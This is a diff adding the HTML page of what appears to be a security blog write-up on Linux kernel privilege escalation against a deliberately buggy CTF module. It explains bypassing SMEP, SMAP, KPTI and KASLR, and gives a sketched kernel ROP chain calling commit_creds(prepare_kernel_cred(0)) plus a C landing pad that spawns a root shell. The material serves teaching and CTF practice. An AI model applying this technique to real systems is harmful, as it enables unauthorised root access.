@@ -1,0 +1,184 @@
+<!doctype html>
+<html lang="en" data-mode="dark" data-crt="on">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#060606" media="(prefers-color-scheme: dark)">
+<meta name="theme-color" content="#f3f3f3" media="(prefers-color-scheme: light)">
+<script>(function(){try{var d=document.documentElement,m=localStorage.getItem('sf.mode');if(!m)m=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';d.setAttribute('data-mode',m);if(localStorage.getItem('sf.crt')==='on')d.setAttribute('data-crt','on');}catch(e){}})();</script>
+<title>kernel LPE — commit_creds(prepare_kernel_cred(0)) — algoatson.github.io</title>
+<meta name="description" content="The data-only path overwrites modprobe_path; the code path hijacks kernel control flow to run commit_creds(prepare_kernel_cred(0)) and returns to a root shell. Here&#x27;s that path, and the four mitigations — SMEP, SMAP, KPTI, KASLR — you step over to walk it.">
+<meta name="author" content="your name here">
+<link rel="canonical" href="https://algoatson.github.io/p/kernel-lpe-commit-creds/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kernel LPE — commit_creds(prepare_kernel_cred(0)) — algoatson.github.io">
+<meta property="og:description" content="The data-only path overwrites modprobe_path; the code path hijacks kernel control flow to run commit_creds(prepare_kernel_cred(0)) and returns to a root shell. Here&#x27;s that path, and the four mitigations — SMEP, SMAP, KPTI, KASLR — you step over to walk it.">
+<meta property="og:url" content="https://algoatson.github.io/p/kernel-lpe-commit-creds/">
+<meta property="og:site_name" content="algoatson.github.io">
+<meta property="og:image" content="https://algoatson.github.io/assets/og/kernel-lpe-commit-creds.png"><meta name="twitter:card" content="summary_large_image">
+<link rel="preload" href="/assets/vga.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+<link rel="alternate" type="application/rss+xml" title="algoatson.github.io" href="/feed.xml">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/pygments.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "headline": "kernel LPE — commit_creds(prepare_kernel_cred(0))", "datePublished": "2026-04-12", "dateModified": "2026-04-12", "author": {"@type": "Person", "name": "your name here"}, "publisher": {"@type": "Person", "name": "segfault"}, "description": "The data-only path overwrites modprobe_path; the code path hijacks kernel control flow to run commit_creds(prepare_kernel_cred(0)) and returns to a root shell. Here's that path, and the four mitigations — SMEP, SMAP, KPTI, KASLR — you step over to walk it.", "url": "https://algoatson.github.io/p/kernel-lpe-commit-creds/", "mainEntityOfPage": "https://algoatson.github.io/p/kernel-lpe-commit-creds/", "keywords": "kernel, pwn"}</script></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<div class="progress" aria-hidden="true"></div>
+<div class="wrap">
+  <div class="frame">
+    <span class="frame__legend"><a href="/">algoatson.github.io</a></span>
+    <span class="frame__addr">~/posts</span>
+
+    <header class="bar">
+      <span class="bar__prompt">&#10095; <b>segfault</b>@algoatson.github.io</span>
+      <nav class="nav" aria-label="primary"><a href="/about/">whoami</a><a href="/" aria-current="page">posts</a><a href="/series/">series</a><a href="/tags/">tags</a></nav>
+      <button class="searchbtn" data-open="search" type="button">grep<kbd>/</kbd></button>
+    </header>
+
+    <main class="main" id="main">
+<a class="backlink" href="/">back to index</a>
+<header class="posthead">
+  <h1>kernel LPE — commit_creds(prepare_kernel_cred(0))</h1>
+  <div class="meta"><span>2026-04-12</span><span>3 min read</span><a class="tag" href="/tags/kernel/">kernel</a> <a class="tag" href="/tags/pwn/">pwn</a></div>
+</header>
+
+<div class="postwrap has-toc">
+  <aside class="toc" aria-label="table of contents"><span class="toctitle">contents</span><div class="toc">
+<ul>
+<li><a href="#the-four-walls-and-the-door-in-each">the four walls, and the door in each</a></li>
+<li><a href="#the-chain">the chain</a></li>
+<li><a href="#notes-from-the-trenches">notes from the trenches</a></li>
+</ul>
+</div>
+</aside>
+  <article class="prose"><p>The <a href="/p/slab-uaf-modprobe/">modprobe_path overwrite</a> is the clean, data-only way
+to escalate. But sometimes you have control flow, not a write-what-where, and the
+canonical kernel payload is two calls: make a fresh root credential, install it
+on the current task.</p>
+<figure class="codeblock"><figcaption><span class="fname">the entire goal, in C</span><span class="lang">c</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#the-entire-goal-in-c-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="the-entire-goal-in-c-1"><span class="n">commit_creds</span><span class="p">(</span><span class="n">prepare_kernel_cred</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span><span class="w">   </span><span class="c1">// current task now has uid 0 creds</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p><code class="highlight">prepare_kernel_cred(0)</code> allocates a <code class="highlight">cred</code> with root ids; <code class="highlight">commit_creds</code> swaps it
+onto the running task. After it returns you're root — you just have to get back to
+userland in one piece and <code class="highlight">execve(&quot;/bin/sh&quot;)</code>.</p>
+<figure class="target"><figcaption><span class="t-label">target</span><span class="t-file">./vuln.ko (a deliberately buggy CTF module)</span></figcaption><div class="target__grid"><dl class="target__facts"><div><dt>arch</dt><dd>amd64-64-little</dd></div><div><dt>control</dt><dd>a kernel stack overflow -&gt; kernel ROP</dd></div></dl><ul class="target__mits"><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">SMEP</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">SMAP</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">KPTI</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">KASLR</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li></ul></div></figure>
+<h2 id="the-four-walls-and-the-door-in-each">the four walls, and the door in each<a class="headerlink" href="#the-four-walls-and-the-door-in-each" title="Permanent link">#</a></h2>
+<p>Every kernel mitigation here removes one easy version of the attack and leaves a
+narrower one:</p>
+<figure class="target"><figcaption><span class="t-label">target</span></figcaption><div class="target__grid target__grid--solo"><ul class="target__mits"><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">SMEP</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">SMAP</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">KPTI</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">KASLR</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li></ul></div></figure>
+<ul>
+<li><strong>SMEP</strong> — the kernel can't <em>execute</em> userland pages. So you can't point kernel
+  <code class="highlight">rip</code> at a userland function (<code class="highlight">ret2usr</code> is dead); you <strong>ROP inside the kernel</strong>
+  instead, with gadgets from the kernel image.</li>
+<li><strong>SMAP</strong> — the kernel can't casually <em>read</em> userland either, so stage your data
+  in kernel memory or registers, not a userland buffer it'll dereference.</li>
+<li><strong>KASLR</strong> — the kernel base is randomized; you need a <strong>leak</strong> (an
+  <code class="highlight">%pK</code>/dmesg/info-leak bug) to rebase every gadget and symbol.</li>
+<li><strong>KPTI</strong> — userland and kernel run on separate page tables, so you can't just
+  <code class="highlight">iretq</code> back; you return through the kernel's own <strong>trampoline</strong>,
+  <code class="highlight">swapgs_restore_regs_and_return_to_usermode</code>, which switches <code class="highlight">CR3</code> for you.</li>
+</ul>
+<h2 id="the-chain">the chain<a class="headerlink" href="#the-chain" title="Permanent link">#</a></h2>
+<p>Save the userland state first (CPU <code class="highlight">cs/ss/rflags/rsp</code> and a target <code class="highlight">rip</code>), because
+the trampoline's <code class="highlight">iretq</code> will restore exactly that and drop you back into your own
+process — now privileged:</p>
+<figure class="codeblock"><figcaption><span class="fname">sketch of the kernel ROP chain</span><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#sketch-of-the-kernel-rop-chain-1"> 1</a></span>
+<span class="normal"><a href="#sketch-of-the-kernel-rop-chain-2"> 2</a></span>
+<span class="normal"><a href="#sketch-of-the-kernel-rop-chain-3"> 3</a></span>
+<span class="normal"><a href="#sketch-of-the-kernel-rop-chain-4"> 4</a></span>
+<span class="normal"><a href="#sketch-of-the-kernel-rop-chain-5"> 5</a></span>
+<span class="normal"><a href="#sketch-of-the-kernel-rop-chain-6"> 6</a></span>
+<span class="normal"><a href="#sketch-of-the-kernel-rop-chain-7"> 7</a></span>
+<span class="normal"><a href="#sketch-of-the-kernel-rop-chain-8"> 8</a></span>
+<span class="normal"><a href="#sketch-of-the-kernel-rop-chain-9"> 9</a></span>
+<span class="normal"><a href="#sketch-of-the-kernel-rop-chain-10">10</a></span>
+<span class="normal"><a href="#sketch-of-the-kernel-rop-chain-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="sketch-of-the-kernel-rop-chain-1"><span class="n">base</span> <span class="o">=</span> <span class="n">leak_kernel_base</span><span class="p">()</span>                       <span class="c1"># defeat KASLR first</span>
+</span><span id="sketch-of-the-kernel-rop-chain-2"><span class="n">rop</span>  <span class="o">=</span> <span class="p">[</span>
+</span><span id="sketch-of-the-kernel-rop-chain-3">    <span class="n">pop_rdi</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>                                 <span class="c1"># prepare_kernel_cred(0)</span>
+</span><span id="sketch-of-the-kernel-rop-chain-4">    <span class="n">base</span> <span class="o">+</span> <span class="n">prepare_kernel_cred</span><span class="p">,</span>
+</span><span id="sketch-of-the-kernel-rop-chain-5">    <span class="n">mov_rdi_rax_ret</span><span class="p">,</span>                            <span class="c1"># rdi = the new cred (returned in rax)</span>
+</span><span id="sketch-of-the-kernel-rop-chain-6">    <span class="n">base</span> <span class="o">+</span> <span class="n">commit_creds</span><span class="p">,</span>                        <span class="c1"># commit_creds(cred) -&gt; we&#39;re root</span>
+</span><span id="sketch-of-the-kernel-rop-chain-7">    <span class="c1"># return to userland through the KPTI trampoline:</span>
+</span><span id="sketch-of-the-kernel-rop-chain-8">    <span class="n">base</span> <span class="o">+</span> <span class="n">kpti_trampoline</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">,</span>            <span class="c1"># skips the mov rdi/swapgs preamble</span>
+</span><span id="sketch-of-the-kernel-rop-chain-9">    <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>                                        <span class="c1"># padding the trampoline pops</span>
+</span><span id="sketch-of-the-kernel-rop-chain-10">    <span class="n">user_rip</span><span class="p">,</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span>
+</span><span id="sketch-of-the-kernel-rop-chain-11"><span class="p">]</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<figure class="codeblock"><figcaption><span class="fname">the userland landing pad</span><span class="lang">c</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#the-userland-landing-pad-1">1</a></span>
+<span class="normal"><a href="#the-userland-landing-pad-2">2</a></span>
+<span class="normal"><a href="#the-userland-landing-pad-3">3</a></span>
+<span class="normal"><a href="#the-userland-landing-pad-4">4</a></span>
+<span class="normal"><a href="#the-userland-landing-pad-5">5</a></span>
+<span class="normal"><a href="#the-userland-landing-pad-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="the-userland-landing-pad-1"><span class="kt">void</span><span class="w"> </span><span class="nf">win</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">            </span><span class="c1">// user_rip points here; runs after we&#39;re root</span>
+</span><span id="the-userland-landing-pad-2"><span class="hll"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">getuid</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
+</span></span><span id="the-userland-landing-pad-3"><span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span><span class="w">  </span><span class="c1">// root shell</span>
+</span><span id="the-userland-landing-pad-4"><span class="p">}</span>
+</span><span id="the-userland-landing-pad-5"><span class="c1">// grab cs/ss/rflags/sp in a saved_state() before triggering the bug,</span>
+</span><span id="the-userland-landing-pad-6"><span class="hll"><span class="c1">// so the trampoline&#39;s iretq returns cleanly into win().</span>
+</span></span></code></pre></div></td></tr></table></div>
+</figure>
+<details class="spoiler">
+<summary>uid=0</summary>
+<p><code class="highlight">commit_creds</code> returns, the trampoline <code class="highlight">iretq</code>s back into <code class="highlight">win()</code>, and the
+saved userland context is intact — except for the one thing that changed:
+<figure class="codeblock"><figcaption><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-1">1</a></span>
+<span class="normal"><a href="#code-2">2</a></span>
+<span class="normal"><a href="#code-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-1"># id
+</span><span id="code-2">uid=0(root) gid=0(root) groups=0(root)
+</span><span id="code-3">segfault{ring0_to_root}
+</span></code></pre></div></td></tr></table></div>
+</figure></p>
+</details>
+<h2 id="notes-from-the-trenches">notes from the trenches<a class="headerlink" href="#notes-from-the-trenches" title="Permanent link">#</a></h2>
+<ul>
+<li><strong><code class="highlight">prepare_kernel_cred(0)</code> is version-sensitive.</strong> On kernels ≥ 6.2 passing a
+  task pointer changed semantics; the <code class="highlight">0</code>/<code class="highlight">NULL</code> form still yields root creds in
+  the versions most CTF modules ship, but check your target's source — some pwns
+  switch to <code class="highlight">&amp;init_cred</code> directly.</li>
+<li><strong>The trampoline offset matters.</strong> Enter
+  <code class="highlight">swapgs_restore_regs_and_return_to_usermode</code> <em>past</em> its <code class="highlight">mov rdi, rsp</code> /
+  register-pop preamble, at the <code class="highlight">swapgs; iretq</code> tail, with the stack laid out exactly
+  how <code class="highlight">iretq</code> wants it (<code class="highlight">rip cs rflags rsp ss</code>).</li>
+<li><strong>Leak before you leap.</strong> With KASLR on, every address above is <code class="highlight">base + offset</code>;
+  without a leak you have nothing. The info-leak bug is usually the hard 80% of the
+  exploit, the cred swap the easy 20%.</li>
+</ul>
+<p>Two function calls separate an unprivileged task from root. The mitigations don't
+forbid those calls — they just make you assemble them from kernel gadgets, rebase
+everything off a leak, and tiptoe back across the KPTI boundary to enjoy the
+result.</p></article>
+</div>
+<section class="related"><span class="related__title">related</span><div class="listing"><div class="row"><span class="row__date">2026-02-14</span><a class="row__tag" href="/tags/kernel/">kernel</a><a class="row__title" href="/p/slab-uaf-modprobe/">a slab use-after-free, from ioctl to root</a><span class="row__min">4 min</span></div><div class="row"><span class="row__date">2026-06-15</span><a class="row__tag" href="/tags/heap/">heap</a><a class="row__title" href="/p/house-of-apple-2/">House of Apple 2 — FSOP after the hooks died</a><span class="row__min">4 min</span></div><div class="row"><span class="row__date">2026-06-14</span><a class="row__tag" href="/tags/heap/">heap</a><a class="row__title" href="/p/house-of-spirit/">the House of Spirit</a><span class="row__min">4 min</span></div></div></section>
+<nav class="pager"><a class="prev" href="/p/first-five-minutes-unknown-binary/"><span class="lbl">&#8249; newer</span>the first five minutes with an unknown binary</a><a class="next" href="/p/anti-debug-bingo/"><span class="lbl">older &#8250;</span>anti-debug bingo: five checks and how they fall</a></nav></main>
+
+    <footer class="status">
+      <span>40 posts</span>
+      <span class="shade">&#9617;&#9618;&#9619;</span>
+      <span>no trackers · no cookies · no js required to read · copying is encouraged</span>
+      <span class="right">
+        <a href="https://github.com/algoatson">github</a><a href="https://twitter.com/yourname">twitter</a><a href="mailto:you@segfault.sh">email</a>
+        <button class="toggle" data-toggle="mode" type="button">[light]</button>
+        <button class="toggle" data-toggle="crt" type="button">[crt]</button>
+        <a href="/feed.xml">[rss]</a>
+      </span>
+    </footer>
+  </div>
+</div>
+
+<div class="palette-mask" role="dialog" aria-modal="true" aria-label="search">
+  <div class="palette">
+    <div class="palette__count">grep<span class="n">0/0</span><span class="rule"></span>posts</div>
+    <div class="palette__input"><span class="sigil">&gt;</span><input type="text"
+       placeholder="fuzzy search title + body…" autocomplete="off" spellcheck="false" aria-label="search query"></div>
+    <div class="palette__results"></div>
+    <div class="palette__hint"><span><kbd>↑↓</kbd>/<kbd>^j ^k</kbd> move</span><span><kbd>⏎</kbd> open</span><span><kbd>esc</kbd> close</span></div>
+  </div>
+</div>
+<div class="help-mask" role="dialog" aria-modal="true" aria-label="keyboard shortcuts">
+  <div class="help"><h2>keys</h2><dl><dt><kbd>/</kbd></dt><dd>search</dd><dt><kbd>j / k</kbd></dt><dd>move / scroll</dd><dt><kbd>enter</kbd></dt><dd>open</dd><dt><kbd>g g / G</kbd></dt><dd>top / bottom</dd><dt><kbd>t</kbd></dt><dd>toggle light</dd><dt><kbd>?</kbd></dt><dd>this help</dd><dt><kbd>esc</kbd></dt><dd>close</dd></dl></div>
+</div>
+<script src="/assets/app.js" defer></script>
+</body>
+</html>
